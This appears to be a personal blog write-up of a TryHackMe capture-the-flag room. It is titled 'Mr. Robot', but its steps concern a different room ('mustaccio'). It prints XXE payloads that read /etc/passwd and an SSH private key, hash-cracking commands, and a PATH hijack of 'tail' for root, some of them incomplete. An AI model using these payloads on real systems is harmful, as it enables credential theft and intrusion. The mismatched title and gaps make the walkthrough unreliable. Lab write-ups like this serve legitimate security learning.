---
layout: post
title: Mr.Robot
date:   2025-10-10 11:05
description: TryHackMe Mr. Robot CTF Write-Up
tags: tryhackme wordpress 
comments: false
---
# Mr. Robot
-TRYHACKME CTF WRITEUP-
[Link To CTF](https://tryhackme.com/room/mrrobot)



mustaccio


nmap shows 80 and 22 open


webpage shows not much - lot of placeholder pages


dirb shows 

/robots.txt and /custom


/robots.txt shows nothing

/custom/js -> shows users backup file

We will use strings to read the file
strings shows:


Note: 
The cat command may not work as expected for a .bak file primarily because .bak files are often binary files, not plain text files. The cat command is designed to print the raw contents of a file to the terminal, which works well for human-readable text but produces gibberish for binary data

Can use online cracker or johntheripper to crack hash


bulldog19

ssh into machine as admin - didn't work
ssh with -i <password file> - didn't work
no other directories
no /admin or /logn


nmap -p- shows higher port open: 8765

navigating here shows admin panel login page


logging in we see a message board
putting in random text gives un an error


Sendign another request and capturing in burp
looking at the response we can see:
1. username: Barry
2. ssh is allowed with the correct key
3. there is a directory /auth/dontforget.bak

This shows us the xml format we will need to use 


https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe

We will modify and test the basic blind XXE vulnerability:

----------------------

<?xml version="1.0" encoding="UTF-8"?>

<comment>
  <name>10DNC</name>
  <author>10DNC</author>
  <com>hacked</com>
</comment>

-----------------------

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>10DNC</name>
  <author>10DNC</author>
  <com>&test;</com>
</comment>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>10DNC</name>
  <author>10DNC</author>
  <com>&test;</com>
</comment>

-----------------

get id_rsa key
save to text file
> nano id_rsa

lower permissions -- 

> chmod 600 id_rsa

use sshjohn to create hash 

> ssh2john id_rsa > hash

use john to crack hash

> john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash

login with ssh 

> ssh -i id_rsa barry@*.*.*.*
> uriel james


get user flag !!!!


priv esc

we see another user with an elf file

running strings we see that its calling another file using tail

We dont have permission to access to this file


Lets hijack the "tail" command


go into /tmp 
echo "/bin/bash" > tail
run the live_log:
/home/joe/live_log

get root
read root flag
